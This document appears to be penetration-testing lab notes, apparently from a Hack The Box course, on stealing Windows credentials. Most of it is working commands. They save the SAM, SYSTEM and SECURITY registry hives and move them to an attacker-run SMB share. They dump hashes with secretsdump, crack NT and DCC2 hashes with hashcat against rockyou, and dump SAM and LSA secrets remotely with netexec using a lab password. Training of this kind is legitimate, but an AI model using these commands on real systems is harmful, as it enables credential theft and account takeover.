## Registry hives
|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|
#### Using reg.exe to copy registry hives

```shell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save 

The operation completed successfully. 

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save 

The operation completed successfully. 

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save 

The operation completed successfully.
```
#### Creating a share with smbserver

```shell
3kjS@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
#### Moving hive copies to share

```shell
C:\> move sam.save \\10.10.15.16\CompData 

1 file(s) moved. 

C:\> move security.save \\10.10.15.16\CompData 

1 file(s) moved. 

C:\> move system.save \\10.10.15.16\CompData 

1 file(s) moved.
```
## Dumping hashes with secretsdump

```shell
3kjS@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
## Cracking hashes with Hashcat

```shell
3kjS@htb[/htb]$ sudo vim hashestocrack.txt
```
#### Running Hashcat against NT hashes

```shell
3kjS@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
## DCC2 hashes

```shell
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

```shell
3kjS@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```
## DPAPI
|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
## Remote dumping & LSA secrets considerations
#### Dumping LSA secrets remotely

```shell
3kjS@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
#### Dumping SAM Remotely

```shell
3kjS@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

